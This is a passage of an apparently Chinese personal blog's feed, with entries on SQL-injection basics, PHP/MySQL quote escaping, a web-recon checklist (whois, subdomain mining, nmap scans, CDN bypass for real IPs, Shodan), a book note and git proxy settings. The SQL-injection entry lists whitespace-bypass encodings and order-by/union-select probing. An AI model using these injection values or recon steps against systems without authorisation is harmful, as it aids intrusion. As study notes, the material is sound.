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" alt="报错注入"></p><ul><li>空格绕过</li></ul><blockquote><p>%09<br>%0a<br>%0c<br>%0d<br>%0b</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;利用order by $column 探测字段数&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;在有报错信息的前提下，如果$column大于原来的字段数，则会报错&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;利用 union select 1,</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="sql注入" scheme="https://guapizhu.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>单引号 双引号</title>
    <link href="https://guapizhu.github.io/2020/09/11/dan-yin-hao-shuang-yin-hao/"/>
    <id>https://guapizhu.github.io/2020/09/11/dan-yin-hao-shuang-yin-hao/</id>
    <published>2020-09-11T08:00:00.000Z</published>
    <updated>2020-09-11T08:39:50.694Z</updated>
    
    <content type="html"><![CDATA[<h2 id="在单引号里写单引号"><a href="#在单引号里写单引号" class="headerlink" title="在单引号里写单引号"></a>在单引号里写单引号</h2><p>php:利用 \ 转义<br>mysql: \‘ 与 ‘’</p><h2 id="在双引号里写双引号"><a href="#在双引号里写双引号" class="headerlink" title="在双引号里写双引号"></a>在双引号里写双引号</h2><p>php:利用 \ 转义<br>mysql: \“ 与 “”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;在单引号里写单引号&quot;&gt;&lt;a href=&quot;#在单引号里写单引号&quot; class=&quot;headerlink&quot; title=&quot;在单引号里写单引号&quot;&gt;&lt;/a&gt;在单引号里写单引号&lt;/h2&gt;&lt;p&gt;php:利用 \ 转义&lt;br&gt;mysql: \‘ 与 ‘’&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="sql注入" scheme="https://guapizhu.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>信息收集索引</title>
    <link href="https://guapizhu.github.io/2020/09/09/web-an-quan-ru-men/xin-xi-shou-ji-suo-yin/"/>
    <id>https://guapizhu.github.io/2020/09/09/web-an-quan-ru-men/xin-xi-shou-ji-suo-yin/</id>
    <published>2020-09-09T08:00:00.000Z</published>
    <updated>2020-09-09T08:09:52.303Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong>目标</strong><br>对于目标的信息收集,主要针对目标的服务器系统、数据库系统、中间件系统、应用程序系统、  以及边界设备等信息。以及收集针对于系统管理员的信息收集。</li><li>whois</li></ul><blockquote><p>kali上有对应工具 也可以网页查询</p></blockquote><ul><li>备案信息查询</li></ul><blockquote><p>网页查询</p></blockquote><ul><li><p>子域名挖掘</p><blockquote><p>子域名挖掘工具，如：Maltego CE , wydomain(kali)<br>搜索引擎挖掘，如：google语法 site<br>在线网页挖掘，关键字：“子域名挖掘 站长之家”<br>证书透明度公开日志枚举<br>其他： phpinfo.me/domain 与 dns.aizhan.com</p></blockquote></li><li><p>web站点信息收集</p></li></ul><blockquote><p>CMS识别，关键字：“CMS在线识别” ；本地工具：whatweb(kali) ，大禹CMS识别<br>文件探测，关键字：御剑，wwwsacn，dirb，dirbuster<br>对于WordPress（CMS的一种），可以使用专门的工具wpscan<br>漏洞查询：乌云</p></blockquote><ul><li>端口信息收集</li></ul><blockquote><p>使用nmap(kali)探测，例：nmap -A -v -T4 $ip<br>使用masscan探测。<br>使用在线网站探测<br>端口攻击，关键字：“端口渗透”</p></blockquote><ul><li>敏感信息收集</li></ul><blockquote><p>http报文的server头与x-powered-by头会暴露目标服务器和使用的编程语言信息。<br>google hacking ， exploit-db中有专门搜集的google hacking<br>github信息泄露</p></blockquote><ul><li>真实IP地址收集</li></ul><blockquote><p>由于CDN的存在会使你访问的服务器可能是CDN服务器<br>利用本地ping初步判断<br>利用在线ping网站判断目标网站是否有CDN，关键字：“站长之家 ping”<br>如果目标使用CDN，需绕过CDN获取真实IP<br>        1.网站的phpinfo.php<br>        2.CDN很贵，通过分站，子域名查询IP地址<br>        3.国外访问，关键字：“ping查询”<br>判断IP是否真实，通过IP访问网站</p></blockquote><ul><li>shodan<br><a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/">Shodan 新手入坑指南</a><br>自行了解shodan高级用法</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;目标&lt;/strong&gt;&lt;br&gt;对于目标的信息收集,主要针对目标的服务器系统、数据库系统、中间件系统、应用程序系统、  以及边界设备等信息。以及收集针对于系统管理员的信息收集。&lt;/li&gt;
&lt;li&gt;whois&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquo</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息收集" scheme="https://guapizhu.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>进化心理学摘要</title>
    <link href="https://guapizhu.github.io/2020/09/08/jin-hua-xin-li-xue-zhai-yao/"/>
    <id>https://guapizhu.github.io/2020/09/08/jin-hua-xin-li-xue-zhai-yao/</id>
    <published>2020-09-08T10:00:00.000Z</published>
    <updated>2020-09-08T10:44:28.499Z</updated>
    
    <content type="html"><![CDATA[<p>不建议购买后阅读，和一本专业的生物书一样，语言严谨平实。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不建议购买后阅读，和一本专业的生物书一样，语言严谨平实。&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="心理学" scheme="https://guapizhu.github.io/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"/>
    
    <category term="阅读过的书籍" scheme="https://guapizhu.github.io/tags/%E9%98%85%E8%AF%BB%E8%BF%87%E7%9A%84%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>git clone 很慢</title>
    <link href="https://guapizhu.github.io/2020/09/08/git-clone-hen-man/"/>
    <id>https://guapizhu.github.io/2020/09/08/git-clone-hen-man/</id>
    <published>2020-09-08T07:00:00.000Z</published>
    <updated>2020-09-08T07:18:42.948Z</updated>
    
    <content type="html"><![CDATA[<h2 id="git-clone-代理"><a href="#git-clone-代理" class="headerlink" title="git clone 代理"></a>git clone 代理</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global http.https://github.com.proxy socks5://127.0.0.1:10808<span class="token function">git</span> config --global https.https://github.com.proxy socks5://127.0.0.1:10808<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="git-clone-换源"><a href="#git-clone-换源" class="headerlink" title="git clone 换源"></a>git clone 换源</h2><p>将原本的网站中的<br><a href="http://github.com/">http://github.com</a><br>替换为github.com.cnpmjs.org</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;git-clone-代理&quot;&gt;&lt;a href=&quot;#git-clone-代理&quot; class=&quot;headerlink&quot; title=&quot;git clone 代理&quot;&gt;&lt;/a&gt;git clone 代理&lt;/h2&gt;&lt;pre class=&quot;line-numbers language</summary>
      
    
    
    
    
    <category term="加速" scheme="https://guapizhu.github.io/tags/%E5%8A%A0%E9%80%9F/"/>
    
    <category term="换源" scheme="https://guapizhu.github.io/tags/%E6%8D%A2%E6%BA%90/"/>
    
  </entry>
  
</feed>
